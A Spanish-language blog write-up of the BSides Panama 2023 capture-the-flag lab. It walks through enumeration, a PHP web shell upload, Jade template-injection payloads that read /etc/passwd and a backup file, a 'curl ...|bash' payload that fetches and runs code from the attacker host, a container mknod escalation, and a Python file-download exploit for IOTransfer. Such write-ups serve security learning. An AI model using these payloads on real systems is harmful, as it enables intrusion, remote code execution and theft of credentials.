</nav> <div class="search col-lg-4 col-md-4 col-xs-12"> <form> <label for="search"></label> <input id="search-input" name="serach" type="text" placeholder="Search Blog Posts..."> <i class="fa fa-search"></i> </form> </div> </div> </div> </header> <section id="l-main"> <div class="container"> <div id="search-result-wrapper" class="hidden"> <h3>Search Results:</h3> <div id="search-result"></div> </div> <style> #search-result-wrapper { font-size: 2rem; background-color: #eee; padding: 5rem; padding-left: 31rem; margin-top: 1rem; margin-bottom: 1rem; box-shadow: 0 0 10px #999; border-radius: 5px; background: white; } #search-result { padding-left: 3rem; } @media (max-width: 1200px) { #search-result-wrapper { font-size: 1.7rem; padding: 2rem; } #search-result { padding-left: 1rem; } } @media (max-width: 768px) { #search-result-wrapper { margin-top: 24rem !important; } } </style> <script> $(document).ready(function() { input = $("#search-input"); wrapper = $("#search-result-wrapper"); wrapper.hide(); wrapper.removeClass("hidden"); input.on("keyup change", function() { if (! input.val()) { wrapper.slideUp("ease"); } else { wrapper.slideDown("ease"); } }); }); </script> <script src="/assets/js/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-result'), json: "/search.json" }); </script> <div class="row"> <div id="markdown-container" class="col-lg-12"> <header> <p id="post-title">Bsides panama 2023</p> <ul class="tags clearfix"> <li><i class="fa fa-tag"></i> Bsides</li> <li><i class="fa fa-tag"></i> Medium</li> </ul> </header> <p><img src="/assets/img/bsides-panama-2023/banner.png" width="1100" /></p> <p>Quiero dar un agradecimiento especial para <code class="language-plaintext highlighter-rouge">Tiz</code> &lt;3 sin él este writeup no hubiera sido posible, dejo por aquí sus redes sociales.</p> <ul> <li><a href="https://twitter.com/cap_tiz">Twitter</a></li> <li><a href="https://www.linkedin.com/in/john-a-kent">Linkedin</a></li> </ul> <h1 id="retos">Retos:</h1> <ul> <li><a href="#archivo-de-respaldo-webserver">Archivo de respaldo (WebServer)</a></li> <li><a href="#acceso-usuario-webserver">Acceso usuario (WebServer)</a></li> <li><a href="#acceso-administrativo-webserver-ruta-alternativa">Acceso administrativo (WebServer)</a></li> <li><a href="#wordpress-webserver-ruta-alternativa">Wordpress (WebServer)</a></li> <li><a href="#passwordtxt-webserver2">Password.txt (WebServer2)</a></li> <li><a href="#acceso-usuario-webserver2">Acceso usuario (WebServer2)</a></li> <li><a href="#acceso-administrativo-webserver2">Acceso administrativo (WebServer2)</a></li> <li><a href="#plataforma-web-webserver2-ruta-alternativa">Plataforma WEB (WebServer2)</a></li> </ul> <h1 id="topología-de-red">Topología de red:</h1> <p><img src="/assets/img/bsides-panama-2023/1.png" width="600" /></p> <h1 id="archivo-de-respaldo-webserver">Archivo de respaldo (WebServer):</h1> <p>Iniciamos el CTF, nos dan únicamente la VPN, así que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra dirección IP la máscara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24.</p> <p><img src="/assets/img/bsides-panama-2023/2.png" width="600" /></p> <p>Teniendo esta red podemos empezar a buscar hosts con el siguiente comando:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sP 10.1.1.1-255
</code></pre></div></div> <ul> <li><a>-sp</a> –&gt; Habilita la función de pingsweep.</li> </ul> <p>Podemos notar que encontró un host.</p> <p><img src="/assets/img/bsides-panama-2023/3.png" width="600" /></p> <p>Manos a la obra, vamos a realizar un escaneo más profundo con el siguiente comando:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target
</code></pre></div></div> <p>Nos encontró los siguientes puertos:</p> <p><img src="/assets/img/bsides-panama-2023/4.png" width="600" /></p> <p>Empezamos enumerando los puertos del servicio Web.</p> <p>Utilizando el comando <a>whatweb</a> podemos ver que estamos ante un CentOS y más información sobre la página Web.</p> <p><img src="/assets/img/bsides-panama-2023/5.png" width="600" /></p> <p>Investigando notamos que hay dos servicios Web en los puertos <a>80</a> y <a>65400</a>.</p> <h1 id="servicio-web-en-el-puerto-80">Servicio Web en el puerto 80:</h1> <p><img src="/assets/img/bsides-panama-2023/6.png" width="600" /></p> <p>Al utilizar fuzzing contra esta página podemos encontrar un archivo <a>notes.txt</a> el cual contiene información que nos puede ser útil más adelante:</p> <p><img src="/assets/img/bsides-panama-2023/7.png" width="600" /></p> <p>Y además encontramos una ruta <a>/wordpress</a> la cual contiene una página en WordPress.</p> <p><img src="/assets/img/bsides-panama-2023/8.png" width="600" /></p> <h1 id="servicio-web-en-el-puerto-65400">Servicio Web en el puerto 65400:</h1> <p>Nos encontramos con una página normal.</p> <p><img src="/assets/img/bsides-panama-2023/9.png" width="600" /></p> <p>Viendo la página Web encontramos un par de credenciales en un post.</p> <p><img src="/assets/img/bsides-panama-2023/10.png" width="600" /></p> <p>Probamos las credenciales contra el panel de administración y estamos dentro como admin.</p> <p>En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la máquina.</p> <p>El archivo que subimos fue el siguiente:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php system($_REQUEST['cmd']); ?&gt;
</code></pre></div></div> <p>Al abrir la imagen(<strong>que en realidad es el archivo php malicioso</strong>) y colocar <code class="language-plaintext highlighter-rouge">?cmd=whoami</code> podemos ejecutar comandos y también ganar acceso al sistema.</p> <p><img src="/assets/img/bsides-panama-2023/11.png" width="600" /></p> <p>Creamos un index.html en nuestra máquina de atacante para hacer la reverse shell.</p> <p><img src="/assets/img/bsides-panama-2023/12.png" width="600" /></p> <p>Después compartimos el index.html con python3 y nos ponemos en escucha con <a>netcat</a>:</p> <p><img src="/assets/img/bsides-panama-2023/13.png" width="600" /></p> <p>Ahora para obtener la reverse shell nos falta hacer lo siguiente:</p> <p><img src="/assets/img/bsides-panama-2023/14.png" width="600" /></p> <p>Estamos dentro como <code class="language-plaintext highlighter-rouge">www-data</code>, hacemos tratamiento de la TTY y listo.</p> <p><img src="/assets/img/bsides-panama-2023/15.png" width="600" /></p> <p>Enumeramos el sistema y con <a>ss -nat</a> nos damos cuenta de que hay un puerto que no podíamos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en <a>notes.txt</a>.</p> <p><img src="/assets/img/bsides-panama-2023/16.png" width="600" /></p> <p>Realizamos un túnel con <a>chisel</a> para tener acceso a ese puerto desde nuestra máquina.</p> <p>En nuestra máquina lo ponemos así: (<strong>Servidor</strong>)</p> <p><img src="/assets/img/bsides-panama-2023/17.png" width="600" /></p> <p>En la sesión de www-data lo ponemos de la siguiente manera: (<strong>Cliente</strong>)</p> <p><img src="/assets/img/bsides-panama-2023/18.png" width="600" /></p> <p>Ahora nos dirigimos a nuestro navegador y podemos colocar <a>127.0.0.1:8080</a> y nos aparecerá el servicio que vimos en <a>notes.txt</a>.</p> <p><img src="/assets/img/bsides-panama-2023/19.png" width="600" /></p> <p>Si le ponemos el argumento <a>/?q=</a> y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un <a>7*7</a> el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS):</p> <p><a>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p> <p><img src="/assets/img/bsides-panama-2023/20.png" width="600" /></p> <p>Para probarlo más podemos utilizar el siguiente payload:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
</code></pre></div></div> <p>Y en efecto nos devuelve el <a>/etc/passwd</a>, pero no de la máquina en la cual tenemos acceso con <strong>www-data</strong> es otra máquina, investigando un poco más nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{root.process.mainModule.require('child_process').spawnSync('cat', ['/root/backup.sql']).stdout}
</code></pre></div></div> <p><img src="/assets/img/bsides-panama-2023/21.png" width="600" /></p> <p>Obtenemos la flag y un usuario y contraseña la cual son:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1

Decodificamos el sha256 y obtenemos lo siguiente:

admin:R@scal
</code></pre></div></div> <h1 id="acceso-usuario-webserver">Acceso usuario (WebServer):</h1> <p>Podemos utilizar estas credenciales para entrar al servidor por ssh.</p> <p><img src="/assets/img/bsides-panama-2023/22.png" width="600" /></p> <p>Además podemos ver la flag:</p> <p><img src="/assets/img/bsides-panama-2023/23.png" width="600" /></p> <h1 id="acceso-administrativo-webserver-ruta-alternativa">Acceso administrativo (WebServer): (ruta alternativa)</h1> <p>Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{root.process.mainModule.require('child_process').exec('curl 172.16.80.42|bash')}
</code></pre></div></div> <p>Tenemos que tener todo <strong>exactamente igual</strong> que cuando ganamos acceso con al WebShell.</p> <p>Hacemos el tratamiento de la TTY y listo.</p> <p><img src="/assets/img/bsides-panama-2023/24.png" width="600" /></p> <p>Estamos como root y en la dirección IP <a>172.17.0.2</a></p> <p>Enumeramos el contenedor y encontramos que podemos utilizar la siguiente información para leer archivos del sistema como usuario privilegiado:</p> <p><a>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod</a></p> <p><a>https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames</a> (La parte de escalada de privilegios)</p> <p>Podemos explotar la capabilitie mknod del contenedor:</p> <p>En el contenedor ejecutamos lo siguiente:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /
mknod sda b 8 0
chmod 777 sda
echo "admin:x:1000:1000:admin,,,:/home/admin:/bin/bash" &gt;&gt; /etc/passwd
su admin --&gt; Ejecutando este comando deberíamos pasar al usuario node
/bin/bash
</code></pre></div></div> <p><img src="/assets/img/bsides-panama-2023/25.png" width="600" /></p> <p>En la máquina víctima como usuario admin ejecutamos lo siguiente:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps -auxf | grep /bin/bash --&gt; Para saber cuál es el PID.
</code></pre></div></div> <p><img src="/assets/img/bsides-panama-2023/26.png" width="600" /></p> <p>Ahora que tenemos el PID en este caso <a>2676</a> nos falta obtener la flag:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -a "root -" /proc/2676/root/sda --&gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando:

strings /proc/2676/root/sda | grep -a "root -"
</code></pre></div></div> <p>Obtenemos la flag:</p> <p><img src="/assets/img/bsides-panama-2023/27.png" width="600" /></p> <h1 id="wordpress-webserver-ruta-alternativa">WordPress (WebServer): (ruta alternativa)</h1> <p>Hay múltiples maneras de obtener esta flag, pero se me hizo muy fácil de esta manera:</p> <p>Tenemos acceso como root a mysql sin proporcionar contraseña:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -uroot -p --&gt; Cuando nos pide un password presionamos enter.

show databases; 

use wordpress;

select * from wp_posts where post_status='trash'; --&gt; Podemos ver posts que han sido borrados.
</code></pre></div></div> <p>En WordPress, la papelera se gestiona en la base de datos de WordPress, específicamente en la tabla <a>wp_posts</a>, cuando se elimina una publicación, su estado se cambia a papelera en la columna <a>post_status</a> de la <a>tabla wp_posts</a>, y permanece allí hasta que se elimine permanentemente o se restaure. La tabla wp_posts también contiene columnas para el título, el contenido, el autor y otra información meta de la publicación.</p> <p>Podemos ver la flag:</p> <p><img src="/assets/img/bsides-panama-2023/28.png" width="600" /></p> <h1 id="passwordtxt-webserver2">Password.txt (WebServer2)</h1> <p>Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no podíamos descubrirlo atrevés de ping, pero si pudimos encontrarlo gracias a los puertos.</p> <p>Ahora que sabemos que dirección IP tiene podemos hacer un escaneo más profundo con <a>nmap</a> y podemos encontrar los siguientes puertos:</p> <p><img src="/assets/img/bsides-panama-2023/29.png" width="600" /></p> <p>Empezamos enumerando el puerto <strong>8080</strong>, y aplicamos fuzzing con el siguiente comando:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ
</code></pre></div></div> <p>Después de esperar un buen rato podemos ver este directorio datos.</p> <p><img src="/assets/img/bsides-panama-2023/30.png" width="600" /></p> <p>Esto es lo que contiene el directorio:</p> <p><img src="/assets/img/bsides-panama-2023/31.png" width="600" /></p> <p>Buscamos en internet “<a>iotransfer windows exploit</a>” nos topamos con este artículo:</p> <p><a>https://www.exploit-db.com/exploits/50974</a></p> <p>Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el código, en mi caso no sirvió por un problema de incompatibilidad con la librería win32com, así que revisando el código podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aquí esta el código: (<code class="language-plaintext highlighter-rouge">Funcional en Linux</code>)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/python3

import requests, json

remoteDownloadPath = r'C:\Users\frank\Desktop\password.txt'
IP = ""
localDownloadPath ="./password.txt"

def CreateDownloadTask(IP, Path) -&gt; str:
    url = f'http://{IP}:7193/index.php?action=createtask'
    task = {
        'method': 'get',
        'version': '1',
        'userid': '*',
        'taskstate': '0',
        'filepath': Path
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task['content'])
    taskid = task['taskid']
    print(f"TaskID: {taskid}")
    return taskid

def ExploitDownload(IP, DownloadPath, ID=None):
    if ID:
        url = f'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}'
    else:
        taskid = CreateDownloadTask(IP, DownloadPath)
        url = f'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}'
    res = requests.get(url)
    return 

if __name__ == '__main__':
        print(f"[*] Downloading the file: {remoteDownloadPath}")
        res = ExploitDownload(IP, remoteDownloadPath)
        file = open(localDownloadPath, "wb+")
        file.write(res.content)
        file.close()
</code></pre></div></div> <p>Lo ejecutamos y obtenemos lo siguiente:</p> <p><img src="/assets/img/bsides-panama-2023/32.png" width="600" /></p> <h1 id="acceso-usuario-webserver2">Acceso usuario (WebServer2):</h1> <p>Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(<strong>10.1.1.100</strong>) y webserver2(<strong>10.1.1.150</strong>).</p> <p><code class="language-plaintext highlighter-rouge">ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389</code></p> <p>Para conectarnos podemos utilizar: <a>xfreerdp</a> o <a>remmina</a>.</p> <p>En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 después de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio.</p> <h1 id="acceso-administrativo-webserver2">Acceso administrativo (WebServer2):</h1> <p>Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(<code class="language-plaintext highlighter-rouge">Está corriendo los servicios Web en los puertos 8080 y 8081</code>), nos dirigimos al directorio <code class="language-plaintext highlighter-rouge">C:\xampp2\htdocs\</code> y subimos una reverse shell para después ejecutarla desde la página web y si vemos quien la esta ejecutando es <code class="language-plaintext highlighter-rouge">WEBSERVER\Administrator</code> así que ya podemos buscar la flag del administrador.</p> <h1 id="plataforma-web-webserver2-ruta-alternativa">Plataforma WEB (WebServer2) (ruta alternativa):</h1> <p>Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos.</p> <p>Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprendí muchas cosas.</p> </div> </div> </div> </section> <style> footer { text-align: center; padding: 20px; /* Optional: Add padding for spacing */ color: #fff; /* Optional: Set text color */ } </style> <footer> <h3>Made with ❤️ by <span style="color: #cf0;">FmF</span></h3> </footer> </body> </html>
